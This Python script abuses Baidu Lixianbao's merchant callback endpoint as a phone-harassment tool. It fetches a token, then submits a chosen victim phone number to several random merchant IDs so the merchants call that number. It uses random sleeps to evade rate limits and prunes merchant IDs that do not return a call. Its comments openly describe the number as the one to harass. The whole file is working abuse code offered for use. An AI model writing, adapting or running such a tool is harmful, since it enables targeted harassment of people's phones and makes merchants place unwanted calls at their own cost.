"""
排山倒海的推广电话，吾辈当以毒攻毒 

这里全是BDCall的逻辑，自行看注释吧

1. 随机3-5个bid提交
2. 随机挂起2-10分钟休息
"""
import requests
import time
import re
import json
import random
from app import redis_store


def get_bids():
    """
    获取商户ID列表 

    先初始化bids范围0-9200，这个范围是我手动实验的，不严格的一个范围
    将范围写进redis
    @return bids    列表类型
    """
    # 从redis中获取bids
    bids = redis_store.get('bids')

    if bids:
        # redis中存在bids
        bids = json.loads(bids)
        return bids
    else:
        # 不存在，初始化
        bids = list(range(0, 9200))
        update_bids(bids)
        return bids


def update_bids(bids):
    """ 
    设置bids进redis

    @param  bdis 需要设置的bids，列表类型
    @return True
    """
    # 设置bids进redis
    redis_store.set('bids', json.dumps(bids))

    # 30天过期
    redis_store.expire('bids', 60 * 60 * 24 * 30)
    return True


def add(phone):
    """ 
    根据提交电话后反悔的状态码，处理商户id的有效性

    @param  phone   需提交的号码
    @return True    任务完成
    """
    # 获取商户列表
    bids = get_bids()

    # 随机次数
    times = random.randint(3, 5)

    # success次数
    success = 0

    # 呼叫频繁重试次数，一般是同一个号码请求太多次了，为了保证业务持久可用，超过重试次数，则直接kill掉此次任务。
    retry_limit = 4

    while times > 0 and retry_limit > 0:
        # 随机一个商户
        index = random.randint(0, len(bids) - 1)

        # 提交电话
        call_status = call(phone, bids[index])

        if call_status == 0:
            # 大概率会收到骚扰号码，记为有效提交。
            print('BID：{} 成功'.format(bids[index]))

            times = times - 1
            success = success + 1
        elif call_status == 105 or call_status == 104:
            # 呼叫过于频繁, 更新重试限制次数
            retry_limit = retry_limit - 1

            print('BID：{}。呼叫过于频繁，重试剩余次数：{}。'.format(bids[index], retry_limit))

        else:
            # 短信通知等场景, 该bid不太有效
            print('不可靠BID：{}'.format(bids[index]))
            # 删除之
            bids.pop(index)
            # 更新之
            update_bids(bids)

        # 休眠一会儿继续，防止呼叫过于频繁
        t = random.randint(2, 10)
        print('{}分钟后继续'.format(t))
        time.sleep(t)

    print('骚扰{}{}次，成功：{}次'.format(phone, times, success))
    return True


def call(phone, bid):
    """
    这里就是骚扰电话的逻辑了，借用百度离线宝
    
    @param  phone           需要骚扰的电话，电话的格式必须正确，这里不做电话有效性验证了
    @param  bid             商户id（目前lxb商户ID范围在0-9200之间大部分有效）
    @return call_status     提交骚扰的状态码，0为骚扰成功，其他的值为可能成功
    @return False           其他异常，未能获取call_status，token等场景
    """
    # 配置参数
    f = 55
    id = bid
    g = 0
    _ = t = int(time.time() * 1000)
    t = int(time.time() * 1000 + 320)
    r = ''
    callback = 'jQuery11110595526036238333_' + str(int(time.time() * 1000))

    # 自定义headers
    my_headers = {
        'Accept':
        'text/javascript, application/javascript, application/ecmascript, application/x-ecmascript, */*; q=0.01',
        'Accept-Encoding':
        'gzip, deflate',
        'Accept-Language':
        'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection':
        'keep-alive',
        'Host':
        'lxbjs.baidu.com',
        'Referer':
        'http://lxbjs.baidu.com/cb/url/show?f={f}&id={id}'.format(f=f, id=id),
        'User-Agent':
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
        'X-Requested-With':
        'XMLHttpRequest'
    }

    # 配置token_url
    get_token_url = 'http://lxbjs.baidu.com/cb/url/check'

    # 构建参数
    params = {
        'callback': callback,
        'f': f,
        'id': id,
        'g': g,
        't': t,
        'r': r,
        '_': _
    }

    # 使用session
    sss = requests.Session()

    # 获取token
    request = sss.get(get_token_url, params=params)

    if request.status_code == 200:
        # 网络请求正常, 获取token
        try:
            tk = loads_jsonp(request.text)['data']['tk']
        except:
            # tk获取失败返回False
            print('获取token失败: {error}'.format(error=request.text))
            return False
    else:
        # http请求异常
        print('请求失败: {error}'.format(error=request.text))
        return False

    # 获取到token，开始提交电话

    # 配置call_url
    get_call_url = 'http://lxbjs.baidu.com/cb/call'

    # 组装参数
    params = {
        'callback': callback,
        'f': f,
        'id': id,
        'tk': tk,
        'vtel': phone,
        '_': _ + 1
    }

    # 提交打电话申请
    request = sss.get(get_call_url, params=params)

    if request.status_code == 200:
        # 请求成功，获取结果类型
        print(request.text)  # 方便跟踪日志

        try:
            call_status = loads_jsonp(request.text)['status']
        except:
            # 无法解析call_status
            print('获取call_status失败: {error}'.format(error=request.content))
            return False

        # 分析: res_json['status'] 为0时，会自动接通商户，大概率会很快收到电话骚扰。非0时，会短信通知商户，这种情况下可能不会电话骚扰或不会立即电话骚扰。

        # 获取到call_status
        return call_status
    else:
        # http请求异常
        print('请求失败，{error}'.format(error=request.content))
        return False


def loads_jsonp(_jsonp):
    """ 
    解析jsonp
    
    # 作者：阿阿聪
    # 链接：https://www.zhihu.com/question/52841349/answer/132564221
    # 来源：知乎
    # 著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。

    :param _jsonp
    :return json
    """
    try:
        return json.loads(re.match(".*?({.*}).*", _jsonp, re.S).group(1))
    except:
        raise ValueError('Invalid Input')
